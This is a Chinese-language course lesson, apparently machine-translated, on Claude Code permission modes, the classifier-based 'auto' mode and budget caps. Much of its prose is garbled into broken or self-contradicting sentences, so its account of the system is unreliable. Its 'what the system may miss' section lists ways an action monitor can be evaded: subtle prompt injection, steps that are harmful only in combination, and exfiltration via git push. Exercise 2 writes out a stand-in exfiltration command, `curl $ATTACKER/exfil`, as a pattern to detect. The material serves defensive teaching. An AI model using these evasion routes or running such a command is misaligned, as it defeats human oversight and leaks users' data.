# 独立代理权限模式

> 权限阶梯从逐动审查到批准一切的分级自主程度是利用管理自主代理 无需询问关于能做什么方式的例子.本课程的例子克劳德代码 暴露了六种模式:"计划"会在每个动作前询问,"默认"(在UI 中标为手册) 只会对有风险的动作询问,"接受编辑"会自动批准文件写入,但仍然确认将执行,"通过许可"会批准一切.`auto`权限模式使用独立的分类器模型取代动作批准:它在每个动作运行前审阅该动作,并阻止任何超出请求范围的升级.`max_turns`和 `max_budget_usd`强制执行.`auto`是否可用取决于计划,组织是否启用,模式和供应商 人类已明确表示,分类器 单独使用并不足.

**类型：**学习 课程
**语言：**字符串 (stdlib,两阶段分类模拟器)
**先修要求：**阶段15 · 01(长视线代理),阶段15 · 09(编码代理景观)
**时间：**约45分钟

## 问题

你机器上的自主编码代理是一个独立的安全类别.攻击面就是该代理能够访问所有文件系统,网络,凭证,剪辑板,任何浏览器标签,任何打开的终端.

克劳德代码的权限系统是人类给出的答案――它不是一个自主/非自主开关,而是六种模式组成的能力阶梯:计划 →默认 →接受编辑 → ... →绕过许可.

工程问题是:这个系统能捕捉到什么,会丢失什么,以及一个特定任务应该使用什么模式?

## 概念

### 六种权限模式

| 模式 | 行为 | 使用场景 |
|---|---|---|
| `plan` | Agent 提出计划；用户批准整个计划；每个动作在执行前都会被审查 | 不熟悉的任务；接近 prod 的代码；第一次在某个 repo 上使用 agent |
| `default` | 在 UI 中标为 “Manual”。Agent 运行动作；对任何“有风险”的动作提示用户（shell exec、destructive operations、network calls） | 大多数交互式 coding sessions |
| `acceptEdits` | 文件写入自动批准；shell exec 和 network calls 仍然提示 | 跨很多文件的 refactoring pass |
| `auto` | 由一个独立的 classifier model 在每个动作运行前审阅它；阻止任何超出请求范围的升级 | 受限 workspace 中的 long-horizon unattended runs |
| `dontAsk` | 从不提示；未被 permission rules 预先批准的动作一律拒绝 | 临时 sandboxes、CI jobs、research scripts |
| `bypassPermissions` | 批准一切 | 文档说明为“只在你愿意丢弃的 ephemeral containers 内使用” |

(上面的名称与公开克劳德代码文件 一致;UI 把 `default`标为 手动。)

### 一页理解自动模式

汽车模式 (自动模式) 是第一个逐动作批准委托给模型的权限模式.

1. **一个独立的 classifier model。**在每一个拟议的动作运行前审阅它,根据声明任务和会议的现状来判断,并阻止任何超出请求范围的升级.
2. **受限的可用性。**是否提供`auto`取决于计划,组织是否启用,模式和供应商.

预算控制与分类器并列出:

- `max_turns` 一个会议中总代次数――
- `max_budget_usd` 触发会议 中止的美元上限.
- 每个工具的动作次数限制,例如不超过N次`WebFetch`呼叫) 』

### 系统能抓住什么

- 工具输入中直接的即时注射,其中注入指令映射到已知有风险的动作形态――
- 重复工具循环分类器可以看到N+1与N 连续五次的操作几乎相同.
- 在本应仅编辑文件的会议中,显然越界的命令.

### 系统可能会错过什么

- **微妙的 prompt injection**直接提示注射不是完全可修复的漏洞.
- **语义层面的不当行为。**每个单独动作看起来都可能安全,但组合的轨迹是有害的.
- **通过合法渠道 exfiltration。**将数据写入你拥有的文件,然后`git push`现在,我们在公共服务中,

### 研究预览 定位

作为研究预览发布文档明确说明,分类器是一层防护,而不是完整的解决方案:用户应将自动模式与预算,拨款者,隔离工作空间和轨迹审计进行结合使用.

### 这条阶梯在你的工作流程中位置

- 不熟悉的任务:从`plan`开始──阅读计划比回滚一次糟糕运行更便宜──
- 已知回复器:`acceptEdits`能省下大量确认点击.
- 无人监视的背景运行:只在你已经测量过爆炸半径的工作空间内使用 `auto`(没有凭证,没有生产,没有你未主动选择的出口)
- 暂时容器:当且仅当容器 及其凭证可丢弃,`dontAsk`现在,`bypassPermissions`才可接受.

```figure
autonomy-oversight
```

## 使用它

`code/main.py`设置一个行动评测分类型, 模拟成两阶段的管道.`auto`模式背后是一个独立的分类器模型,而不是有文档说明的两阶段契约. 阶段1是针对拟议动作的廉价关键词规则; 阶段2是更慢的多规则审查者――司机输入一个简短的合成轨迹.

## 交付它

`outputs/skill-permission-mode-picker.md`任务描述将与正确的权限模式,预算上限和需要的隔离相匹配.

## 练习

1. 运行`code/main.py`◎ 哪种合成行动类型从未被标记为第一阶段,但总是被捕获为第二阶段?

2. 扩展第一阶段规则集,以捕捉特定的已知坏形状`curl $ATTACKER/exfil`在良性作用样本上测量虚假阳性率.

3. 阅读人类的"代理循环如何工作"文档――列出代理在`default`模式下默认触碰的每一种外部状态. 在无监督的运行.`auto`什么需要单独加门?

4. 设计一个24小时无监督运行预算:`max_turns`,我知道.`max_budget_usd`‧每工具帽‧允许者‧说明每个数字的理由‧

5. 描述一个轨迹:其中每一个单独动作都被分类批准,但组合行为却是错误的.

## 关键术语

| 术语 | 人们常说 | 实际含义 |
|---|---|---|
| 权限模式 | “agent 能做多少事” | 控制逐动作批准的六种命名 policy 之一 |
| plan mode | “做任何事前都询问” | Agent 编写计划；用户在执行前批准 |
| acceptEdits | “让它写文件” | 文件写入自动批准；shell exec 仍然提示 |
| auto | “Auto approvals” | 独立的 classifier model 审阅每个动作；阻止超出请求范围的升级 |
| bypassPermissions | “Full YOLO” | 批准一切；预期用于 ephemeral containers |
| Stage 1（simulator） | “Fast keyword check” | `code/main.py` 中针对拟议动作的廉价 rule |
| Stage 2（simulator） | “Deep review” | `code/main.py` 中针对被标记动作的更慢 multi-rule reviewer |
| Research preview | “Not GA” | Anthropic 对 failure mode 仍在被映射的功能所使用的定位 |

## 延伸阅读

- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) 权限模式,预算,行动格式.
- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview)管理服务 执行模型。
- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code)功能表面与自动模式公告
- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) 塑造分类器 判断的基于理性的层――
- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) 关于长视界许可设计的内部视角──
